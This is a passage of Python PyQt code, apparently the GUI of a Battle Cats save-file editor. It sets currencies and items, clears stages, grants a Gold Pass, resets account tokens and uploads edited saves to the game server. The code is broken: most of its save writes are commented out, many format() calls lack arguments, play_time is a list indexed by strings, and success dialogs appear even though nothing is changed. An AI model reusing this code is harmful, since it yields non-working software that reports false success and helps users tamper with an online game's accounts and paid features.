                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Super Rare Catseye Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["catseyes"][3], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Super Rare] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["catseyes"][3] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "Uber Rare" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Uber Rare Catseye Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["catseyes"][4], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Uber Rare] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["catseyes"][4] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "Legend" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Legend Catseye Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["catseyes"][5], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Legend] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["catseyes"][5] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "Dark" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter Dark Catseye Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["catseyes"][6], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [Dark] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["catseyes"][6] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "SELECT ALL (PUT THIS ONLY)" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter ALL Value\n\nMAX: {}'.format(9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [ALL] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["catseyes"][0] = tre_id
                            #save_stats["catseyes"][1] = tre_id
                            #save_stats["catseyes"][2] = tre_id
                            #save_stats["catseyes"][3] = tre_id
                            #save_stats["catseyes"][4] = tre_id
                            #save_stats["catseyes"][5] = tre_id
                            #save_stats["catseyes"][6] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                else:
                    QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                    break
            self.progressbar.setValue(100)
            QMessageBox.information(self, 'Success', 'Successfully Applied Values',
                            QMessageBox.Ok)
            self.progressbar.setValue(0)

    def CataminConnect(self):
        dialog = CataminsInputDialog()
        execute = dialog.exec_()
        if execute:
            self.progressbar.setValue(0)
            print("Items: {}".format(execute))
            listlength = len(execute)
            print("List Length: {}".format(listlength))
            i = 0
            for i in range(listlength):
                if "A" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter A Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["catamins"][0], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [A] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["catamins"][0] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "B" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter B Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["catamins"][1], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [B] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["catamins"][1] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "C" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter C Value\n\nCurrent: {}\nMAX: {}'.format())#save_stats["catamins"][2], 9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [C] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["catamins"][0] = tre_id
                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                elif "SELECT ALL (PUT THIS ONLY)" in str(execute[i]):
                    tre_id, ok = QInputDialog.getText(self, 'Enter Value', 'Enter ALL Value\n\nMAX: {}'.format(9999))
                    if ok:
                        tre_id = int(tre_id)
                        if tre_id >= 10000:
                            QMessageBox.warning(self, 'Warning', 'Max value for [ALL] is 9999',
                                        QMessageBox.Ok)
                            self.progressbar.setValue(0)
                            break
                        
                            #save_stats["catamins"][0] = tre_id
                            #save_stats["catamins"][1] = tre_id
                            #save_stats["catamins"][2] = tre_id

                    else:
                        QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                        break
                else:
                    QMessageBox.critical(self, 'Error', 'Value must not be empty.',
                                        QMessageBox.Ok)
                    break
            self.progressbar.setValue(100)
            QMessageBox.information(self, 'Success', 'Successfully Applied Values',
                            QMessageBox.Ok)
            self.progressbar.setValue(0)

    def connect_treasures_dialog(self):
        dialog = TreasuresInputDialog()
        stages = dialog.exec_()
        if stages:
            print("Stages: {}".format(stages))
            listlength = len(stages)
            print("List Length: {}".format(listlength))
            i = 0
            level_string = ""
            for i in range(listlength):
                if "1. Empire of Cats 1" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "2. Empire of Cats 2" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "3. Empire of Cats 3" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "4. Into the Future 1" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "5. Into the Future 2" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "6. Into the Future 3" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "7. Cats of the Cosmos 1" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "8. Cats of the Cosmos 2" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "9. Cats of the Cosmos 3" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                level_string += str(str(numbers)+" ")
                i += 1
            level_list = list(level_string.split(" "))
            level_list = list(filter(None, level_list))
            level_list = [eval(i) for i in level_list]
            tre_id, ok = QInputDialog.getText(self, 'Select Treasure', 'Enter Treasure ID\n\n3 = Superior\n2 = Normal\n1 = Inferior\n0 = None')
            if not ok:
                QMessageBox.critical(self, 'Error', 'Treasure IDs must not be empty.',
                                            QMessageBox.Ok)
            else:
                edits.levels.treasures.specific_stages_all_chapters(save_stats, level_list, tre_id)
                self.progressbar.setValue(100)
                QMessageBox.information(self, 'Success', 'Successfully Set Treasures in Selected Levels',
                                                QMessageBox.Ok)
                self.progressbar.setValue(0)

    def connect_main_level_dialog(self):
        dialog = MainLevelInputDialog()
        stages = dialog.exec_()
        if stages:
            print("Stages: {}".format(stages))
            listlength = len(stages)
            print("List Length: {}".format(listlength))
            i = 0
            level_string = ""
            for i in range(listlength):
                if "1. Empire of Cats 1" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "2. Empire of Cats 2" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "3. Empire of Cats 3" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "4. Into the Future 1" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "5. Into the Future 2" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "6. Into the Future 3" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "7. Cats of the Cosmos 1" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "8. Cats of the Cosmos 2" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "9. Cats of the Cosmos 3" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                level_string += str(str(numbers)+" ")
                i += 1
            level_list = list(level_string.split(" "))
            level_list = list(filter(None, level_list))
            level_list = [eval(i) for i in level_list]
            edits.levels.main_story.clear_all(save_stats, level_list)
            self.progressbar.setValue(100)
            QMessageBox.information(self, 'Success', 'Successfully Cleared Selected Levels',
                                            QMessageBox.Ok)
            self.progressbar.setValue(0)

    def LegendStoryClear(self):
        tre_id, ok = QInputDialog.getText(self, 'Select Levels', 'Enter Subchapter Ids:\n\nInput Type: Range / spaces separated\nEx: 1-49 / 1 2 3')
        if not ok:
            QMessageBox.critical(self, 'Error', 'Levels IDs must not be empty.',
                                        QMessageBox.Ok)
        else:
            tre_id = str(tre_id)
            star, ok = QInputDialog.getText(self, "Type Stars", "Enter Star amount (1, 2, 3, 4)")
            if not ok:
                QMessageBox.critical(self, 'Error', 'Star must not be empty.',
                                        QMessageBox.Ok)
            else:
                star = str(star)
                edits.levels.event_stages.stories_of_legend(save_stats, tre_id, star)
                self.progressbar.setValue(100)
                QMessageBox.information(self, 'Success', 'Successfully Cleared Selected Levels',
                                            QMessageBox.Ok)
                self.progressbar.setValue(0)

    def UncannyClear(self):
        tre_id, ok = QInputDialog.getText(self, 'Select Levels', 'Enter Subchapter Ids:\n\nInput Type: Range / spaces separated\nEx: 1-49 / 1 2 3')
        if not ok:
            QMessageBox.critical(self, 'Error', 'Levels IDs must not be empty.',
                                        QMessageBox.Ok)
        else:
            tre_id = str(tre_id)
            star, ok = QInputDialog.getText(self, "Type Stars", "Enter Star amount (1, 2, 3, 4)")
            if ok == None:
                QMessageBox.critical(self, 'Error', 'Star must not be empty.',
                                        QMessageBox.Ok)
            else:
                star = str(star)
                edits.levels.uncanny.edit_uncanny(save_stats, tre_id, star)
                self.progressbar.setValue(100)
                QMessageBox.information(self, 'Success', 'Successfully Cleared Selected Levels',
                                            QMessageBox.Ok)
                self.progressbar.setValue(0)
    
    def AkuStagesClear(self):
        tre_id, ok = QInputDialog.getText(self, 'Select Levels', 'Enter Subchapter Id:\n\nInput Type: Number\nStage 1: 1\nAll: 49')
        
        if ok:
            tre_id = str(tre_id)
            edits.levels.aku.edit_aku(save_stats, tre_id)
            self.progressbar.setValue(100)
            QMessageBox.information(self, 'Success', 'Successfully Cleared Selected Levels',
                                        QMessageBox.Ok)
            self.progressbar.setValue(0)
    
    def filibuster_reclear(self):
        edits.levels.allow_filibuster_clearing.allow_filibuster_clearing(save_stats)
        self.progressbar.setValue(100)
        QMessageBox.information(self, 'Success', 'Successfully Uncleared filibuster Stage.\nNow you can reclear it.',
                                    QMessageBox.Ok)
        self.progressbar.setValue(0)

    def OutbreakClear(self):
        dialog = OutbreakDialog()
        stages = dialog.exec_()
        if stages:
            print("Stages: {}".format(stages))
            listlength = len(stages)
            print("List Length: {}".format(listlength))
            i = 0
            level_string = ""
            for i in range(listlength):
                if "1. Empire of Cats 1" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "2. Empire of Cats 2" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "3. Empire of Cats 3" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "4. Into the Future 1" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "5. Into the Future 2" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "6. Into the Future 3" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                elif "7. Cats of the Cosmos 1" in str(stages[i]):
                    numbers = int(str(stages[i]).split(".")[0]) - 1
                level_string += str(str(numbers)+" ")
                i += 1
            level_list = list(level_string.split(" "))
            level_list = list(filter(None, level_list))
            level_list = [eval(i) for i in level_list]
            edits.levels.outbreaks.edit_outbreaks(save_stats, level_list)
            self.progressbar.setValue(100)
            QMessageBox.information(self, 'Success', 'Successfully Cleared Selected Levels',
                                            QMessageBox.Ok)
            self.progressbar.setValue(0)
    
    def ResetToken(self):
        edits.other.create_new_account.create_new_account(save_stats)
        self.progressbar.setValue(100)
        QMessageBox.information(self, 'Success', 'Successfully Reset Token and Inquiry Code',
                                        QMessageBox.Ok)
        self.progressbar.setValue(0)

    def GoldPass(self):
        edits.other.get_gold_pass.get_gold_pass(save_stats)
        self.progressbar.setValue(100)
        QMessageBox.information(self, 'Success', 'Successfully Set Gold Pass',
                                        QMessageBox.Ok)
        self.progressbar.setValue(0)

    def GachaSeed(self):
        tre_id, ok = QInputDialog.getText(self, 'Seed', 'Current Seed Number: {}\nEnter Seed Number to change.'.format())#save_stats["rare_gacha_seed"]["Value"]))
        if ok:
            #save_stats["rare_gacha_seed"]["Value"] = int(tre_id)
            self.progressbar.setValue(100)
            QMessageBox.information(self, 'Success', 'Successfully Set Gacha Seed',
                                            QMessageBox.Ok)
            self.progressbar.setValue(0)

    def PlayTime(self):
        play_time = ["hh", "mm"]#save_stats["play_time"]
        tre_id, ok = QInputDialog.getText(self, 'Play Time', 'Current Play Time: {} Hours {} Minutes\nEnter Time to change.\nFormat: HH:MM\nEx: 72 hours 23 minutes - 72:23'.format(play_time["hh"], play_time["mm"]))
        if ok:
            plset = tre_id.split(":")
            hourset = int(plset[0])
            minset = int(plset[1])
            play_time["hh"] = hourset
            play_time["mm"] = minset
            self.progressbar.setValue(100)
            QMessageBox.information(self, 'Success', 'Successfully Set Play Time',
                                            QMessageBox.Ok)
            self.progressbar.setValue(0)

    def EnemyGuide(self):
        edits.other.unlock_enemy_guide.enemy_guide(save_stats)
        self.progressbar.setValue(100)
        QMessageBox.information(self, 'Success', 'Successfully Unlocked All Enemy Guide',
                                        QMessageBox.Ok)
        self.progressbar.setValue(0)

    def JSON(self):
        edits.save_management.save.save_save(save_stats)
        config_manager.get_config_path2()
        files = edits.save_management.other.export(save_stats)

        self.progressbar.setValue(100)
        QMessageBox.information(self, 'Success', 'Successfully Converted Data at {}'.format(helper.get_save_path() + ".json"),
                                        QMessageBox.Ok)
        self.progressbar.setValue(0)

    def ConvertVersion(self):
        reply = QMessageBox.question(self, 'Beta Feature', 'Warning!\nThis feature is OFFICIAL BETA FEATURE!!\nPlease be careful when using this.\nDo you want to continue?',
                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
        if reply == QMessageBox.Yes:
            gvs = ["en", "jp", "kr", "tw"]
            
            tre_id, ok = QInputDialog.getText(self, 'Select Version', 'Select Version Number\n1: {}\n2: {}\n3: {}\n'.format(gvs[0], gvs[1], gvs[2]))
            if ok:
                try:
                    version_id = int(tre_id) - 1
                    version_id = gvs[version_id]
                    edits.save_management.convert.convert_save(save_stats, version_id)
                    self.progressbar.setValue(100)
                    QMessageBox.information(self, 'Success', 'Successfully Converted Data to {}'.format(version_id),
                                                    QMessageBox.Ok)
                    self.progressbar.setValue(0)
                except:
                    QMessageBox.critical(self, 'Unknown Error', 'Convert failed. Restored Data.',
                                                    QMessageBox.Ok)
                    self.progressbar.setValue(0)
                    pass
        else:
            pass

    def FixEquip(self):
        edits.other.unlock_equip_menu.unlock_equip(save_stats)
        self.progressbar.setValue(100)
        QMessageBox.information(self, 'Success', 'Successfully Fixed Equip Menu Crashing',
                                        QMessageBox.Ok)
        self.progressbar.setValue(0)

    def FixGamatoto(self):
        edits.gamototo.fix_gamatoto.fix_gamatoto(save_stats)
        self.progressbar.setValue(100)
        QMessageBox.information(self, 'Success', 'Successfully Fixed Gamatoto Crashing',
                                        QMessageBox.Ok)
        self.progressbar.setValue(0)

    def EditConfigPath(self):
        reply = QMessageBox.question(self, 'DANGER ZONE', 'Warning!\nThis can break the editor!!\nPlease be careful when using this.\nDo you want to continue?',
                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
        if reply == QMessageBox.Yes:
            config_manager.edit_config_path(save_stats)
            self.progressbar.setValue(100)
            QMessageBox.information(self, 'Success', 'Successfully Changed Config File Path',
                                            QMessageBox.Ok)
            self.progressbar.setValue(0)
        else:
            pass
            
        

        
    def upload_data(self):
        try:
            edits.save_management.save.save_save(save_stats)
            save_data = BCSFE_Python.serialise_save.start_serialize(save_stats)
            self.progressbar.setValue(31)
            save_data = BCSFE_Python.helper.write_save_data(
                save_data, #save_stats["version"], helper.get_save_path(), False
            )
            self.progressbar.setValue(78)
            upload_data = BCSFE_Python.server_handler.upload_handler(save_stats, helper.get_save_path())
            transfer_code = upload_data['transferCode']
            confirmation_code = upload_data['pin']
            self.progressbar.setValue(99)
            desktop = os.path.join(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop'), "account_code.txt") 
            with open(desktop, "w+", encoding="utf-8") as file:
                file.write("Transfer Code: {}\nConfirmation Code: {}".format(transfer_code, confirmation_code))
            self.progressbar.setValue(100)
            QMessageBox.information(self, 'Success', 'Successfully uploaded data and write code to: [Desktop\\account_code.txt]',
                                        QMessageBox.Ok)
            self.progressbar.setValue(0)
        except Exception as e:
            QMessageBox.critical(self, 'Error', '{}'.format(traceback.format_exc()),
                                    QMessageBox.Ok)
            self.progressbar.setValue(0)
            pass
    def savefile(self):
        try:
            edits.save_management.save.save_save(save_stats)
            QMessageBox.information(self, 'Success', 'Successfully saved data',
                                        QMessageBox.Ok)
        except Exception as e:
            QMessageBox.critical(self, 'Error', '{}'.format(traceback.format_exc()),
                                    QMessageBox.Ok)
            self.progressbar.setValue(0)
            pass
    
    def edit_cats(self):
        #global save_stats
        try:
            self.progressbar.setValue(100)
            selected = self.item_menu_combobox_4.currentText()
            if selected == "Add Cats with Levels":
                id = str(self.amountinput_2.text())
                if id == "all" or id == "All":
                    
						

                    QMessageBox.information(self, 'Success', 'Successfully added [All] Cats with [{}] level'.format(),
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
                else:
                    
                    QMessageBox.information(self, 'Success', 'Successfully added [{}] Cats with [{}] level'.format(id, ),
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
            elif selected == "Delete Cats":
                id = str(self.amountinput_2.text())
                if id == "all" or id == "All":
                    
						

                    QMessageBox.information(self, 'Success', 'Successfully added [All] Cats with [{}] level'.format(),
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
                else:
                    
                    QMessageBox.information(self, 'Success', 'Successfully added [{}] Cats with [{}] level'.format(id),
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
            elif selected == "Upgrade Cats":
                
                    QMessageBox.information(self, 'Success', 'Successfully set [{}] Cats with [{}] level'.format(id),
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
            elif selected == "True Form Cats":
                
                    QMessageBox.information(self, 'Success', 'Successfully set [{}] Cats evolved'.format(id),
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
                

        except Exception as e:
            QMessageBox.critical(self, 'Error', '{}'.format(traceback.format_exc()),
                                    QMessageBox.Ok)
            self.progressbar.setValue(0)
            pass

    def edit_item(self):
        try:
            self.progressbar.setValue(100)
            selected = self.item_menu_combobox.currentText()
            if selected == "Cat Food":
                amount = int(self.amountinput.text())
                intamount = int(amount)
                if intamount >= 45001:
                    QMessageBox.warning(self, 'Warning', 'Max value for [Cat Food] is 45000',
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
                else:
                    try:
                        #save_stats["cat_food"]["Value"] = intamount
                        edits.save_management.save.save_save(save_stats)
                        self.progressbar.setValue(100)
                        QMessageBox.information(self, 'Success', 'Successfully changed [Cat Food] value to {}'.format(intamount),
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    except Exception as e:
                        QMessageBox.critical(self, 'Error', '{}'.format(traceback.format_exc()),
                                                QMessageBox.Ok)
                        self.progressbar.setValue(0)
                        pass
            elif selected == "XP":
                amount = int(self.amountinput.text())
                intamount = int(amount)
                if intamount >= 100000000:
                    QMessageBox.warning(self, 'Warning', 'Max value for [XP] is 99999999',
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
                else:
                    try:
                        #save_stats["xp"]["Value"] = intamount
                        edits.save_management.save.save_save(save_stats)
                        self.progressbar.setValue(100)
                        QMessageBox.information(self, 'Success', 'Successfully changed [XP] value to {}'.format(intamount),
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    except Exception as e:
                        QMessageBox.critical(self, 'Error', '{}'.format(traceback.format_exc()),
                                                QMessageBox.Ok)
                        self.progressbar.setValue(0)
                        pass
            elif selected == "Tickets":
                ticket_type = self.item_menu_combobox_2.currentText()
                amount = int(self.amountinput.text())
                if ticket_type == "Normal Ticket":
                    max = 3000
                    if amount >= max:
                        QMessageBox.warning(self, 'Warning', 'Max value for [Normal Ticket] is {}'.format(max-1),
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    else:
                        #save_stats["normal_tickets"]["Value"] = amount
                        QMessageBox.information(self, 'Success', 'Successfully changed [Normal Ticket] value to {}'.format(amount),
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)
                elif ticket_type == "Rare Ticket":
                    max = 300
                    if amount >= max:
                        QMessageBox.warning(self, 'Warning', 'Max value for [Rare Ticket] is {}'.format(max-1),
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    else:
                        #save_stats["rare_tickets"]["Value"] = amount
                        QMessageBox.information(self, 'Success', 'Successfully changed [Rare Ticket] value to {}'.format(amount),
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)
                elif ticket_type == "Platinum Ticket":
                    max = 10
                    if amount >= max:
                        QMessageBox.warning(self, 'Warning', 'Max value for [Platinum Ticket] is {}'.format(max-1),
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    else:
                        #save_stats["platinum_tickets"]["Value"] = amount
                        QMessageBox.information(self, 'Success', 'Successfully changed [Platinum Ticket] value to {}'.format(amount),
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)
                elif ticket_type == "Legend Ticket":
                    max = 5
                    if amount >= max:
                        QMessageBox.warning(self, 'Warning', 'Max value for [Legend Ticket] is {}'.format(max-1),
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    else:
                        #save_stats["legend_tickets"]["Value"] = amount
                        QMessageBox.information(self, 'Success', 'Successfully changed [Legend Ticket] value to {}'.format(amount),
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)
                else:
                    QMessageBox.warning(self, 'Warning', 'Invalid ticket type',
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
            elif selected == "NP":
                amount = int(self.amountinput.text())
                max = 10000
                if amount >= max:
                    QMessageBox.warning(self, 'Warning', 'Max value for [NP] is {}'.format(max-1),
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
                else:
                    #save_stats["np"]["Value"] = amount
                    QMessageBox.information(self, 'Success', 'Successfully changed [NP] value to {}'.format(amount),
                                            QMessageBox.Ok)
                    self.progressbar.setValue(0)
            elif selected == "Leadership":
                amount = int(self.amountinput.text())
                max = 10000
                if amount >= max:
                    QMessageBox.warning(self, 'Warning', 'Max value for [Leadership] is {}'.format(max-1),
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
                else:
                    #save_stats["leadership"]["Value"] = amount
                    QMessageBox.information(self, 'Success', 'Successfully changed [Leadership] value to {}'.format(amount),
                                            QMessageBox.Ok)
                    self.progressbar.setValue(0)
            elif selected == "Battle Items":
                amount = int(self.amountinput.text())
                max = 10000
                if amount >= max:
                    QMessageBox.warning(self, 'Warning', 'Max value for [Battle Items] is {}'.format(max-1),
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
                else:
                    item_type = self.item_menu_combobox_2.currentText()
                    if item_type == "Speed Up":
                        #save_stats["battle_items"][0] = amount
                        QMessageBox.information(self, 'Success', 'Successfully changed [Speed Up] value to {}'.format(amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Treasure Radar":
                        #save_stats["battle_items"][1] = amount
                        QMessageBox.information(self, 'Success', 'Successfully changed [Treasure Radar] value to {}'.format(amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Rich Cat":
                        #save_stats["battle_items"][2] = amount
                        QMessageBox.information(self, 'Success', 'Successfully changed [Rich Cat] value to {}'.format(amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Cat CPU":
                        #save_stats["battle_items"][3] = amount
                        QMessageBox.information(self, 'Success', 'Successfully changed [Cat CPU] value to {}'.format(amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Cat Jobs":
                        #save_stats["battle_items"][4] = amount
                        QMessageBox.information(self, 'Success', 'Successfully changed [Cat Jobs] value to {}'.format(amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Sniper the Cat":
                        #save_stats["battle_items"][5] = amount
                        QMessageBox.information(self, 'Success', 'Successfully changed [Sniper the Cat] value to {}'.format(amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    else:
                        QMessageBox.warning(self, 'Warning', 'Invalid item type',
                                        QMessageBox.Ok)
                        self.progressbar.setValue(0)
            elif selected == "Cat Fruit / Behemoth Stones":
                amount = int(self.amountinput.text())
                item_type = self.item_menu_combobox_2.currentText()
                max = 10000
                if amount >= max:
                    QMessageBox.warning(self, 'Warning', 'Max value for [Cat Fruit / Behemoth Stones] is {}'.format(max-1),
                                        QMessageBox.Ok)
                    self.progressbar.setValue(0)
                else:
                    value = amount
                    if item_type == "Select All":
                        
                        #save_stats["cat_fruit"][0] = value
                        #save_stats["cat_fruit"][1] = value
                        #save_stats["cat_fruit"][2] = value
                        #save_stats["cat_fruit"][3] = value
                        #save_stats["cat_fruit"][4] = value
                        #save_stats["cat_fruit"][5] = value
                        #save_stats["cat_fruit"][6] = value
                        #save_stats["cat_fruit"][7] = value
                        #save_stats["cat_fruit"][8] = value
                        #save_stats["cat_fruit"][9] = value
                        #save_stats["cat_fruit"][10] = value
                        #save_stats["cat_fruit"][11] = value
                        #save_stats["cat_fruit"][12] = value
                        #save_stats["cat_fruit"][13] = value
                        #save_stats["cat_fruit"][14] = value
                        #save_stats["cat_fruit"][15] = value
                        #save_stats["cat_fruit"][16] = value
                        #save_stats["cat_fruit"][17] = value
                        #save_stats["cat_fruit"][18] = value
                        #save_stats["cat_fruit"][19] = value
                        #save_stats["cat_fruit"][20] = value
                        #save_stats["cat_fruit"][21] = value
                        #save_stats["cat_fruit"][22] = value
                        #save_stats["cat_fruit"][23] = value
                        #save_stats["cat_fruit"][24] = value
                        #save_stats["cat_fruit"][25] = value
                        #save_stats["cat_fruit"][26] = value
                        #save_stats["cat_fruit"][27] = value
                        #save_stats["cat_fruit"][28] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(selected, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Purple Catfruit Seed":
                        #save_stats["cat_fruit"][0] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Red Catfruit Seed":
                        #save_stats["cat_fruit"][1] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Blue Catfruit Seed":
                        #save_stats["cat_fruit"][2] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Green Catfruit Seed":
                        #save_stats["cat_fruit"][3] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Yellow Catfruit Seed":
                        #save_stats["cat_fruit"][4] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Purple Catfruit":
                        #save_stats["cat_fruit"][5] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Red Catfruit":
                        #save_stats["cat_fruit"][6] = value
                        QMessageBox.information(self, 'Success', 'Successfully changed [{}] value to {}'.format(item_type, amount),
                                            QMessageBox.Ok)
                        self.progressbar.setValue(0)
                    elif item_type == "Blue Catfruit":
                        #save_stats["cat_fruit"][7] = value
